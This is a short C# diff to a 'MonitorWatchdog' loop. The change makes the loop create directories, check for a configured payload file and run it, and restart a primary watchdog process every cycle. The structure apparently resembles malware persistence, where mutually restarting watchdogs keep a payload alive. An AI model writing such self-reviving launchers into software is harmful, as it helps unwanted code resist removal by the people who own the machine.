@@ -35,8 +35,18 @@ namespace MonitorWatchdog
             int SecondarySleep = Config.sleepTime + 5000;
             while (true)
             {
-                watchdogHelper.verifyFilePathsSourceAndDest(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName);
+
+                watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
+                watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
+                watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
+
+                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
+                watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
+
+                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName);
                 watchdogHelper.CheckAndRunWatchdog(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName, Config.PrimaryWatchdogMutexName);
+
+
                 Thread.Sleep(SecondarySleep);
             }
         }
